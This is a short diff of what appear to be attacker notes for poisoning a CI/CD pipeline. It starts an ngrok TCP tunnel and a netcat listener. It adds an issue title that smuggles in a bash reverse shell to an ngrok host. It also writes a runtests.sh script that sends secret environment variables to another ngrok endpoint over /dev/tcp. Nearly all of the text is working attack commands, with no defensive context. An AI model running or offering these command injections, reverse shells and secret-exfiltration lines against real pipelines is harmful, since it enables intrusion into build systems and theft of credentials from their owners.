@@ -1,5 +1,9 @@
 ngrok tcp 1000
 sudo nc -lvk 1000
+
+New malicious issue title" && bash -i >& /dev/tcp/6.tcp.eu.ngrok.io/15730 0>&1 && echo "
+
+
 echo " echo D-PPE > ./runtests.out" > ./runtests.sh 
 echo " echo Execution from WRITE user > /dev/tcp/4.tcp.eu.ngrok.io/18328" >> ./runtests.sh
 echo " env | grep MY_SECRET > /dev/tcp/4.tcp.eu.ngrok.io/18328" >> ./runtests.sh 
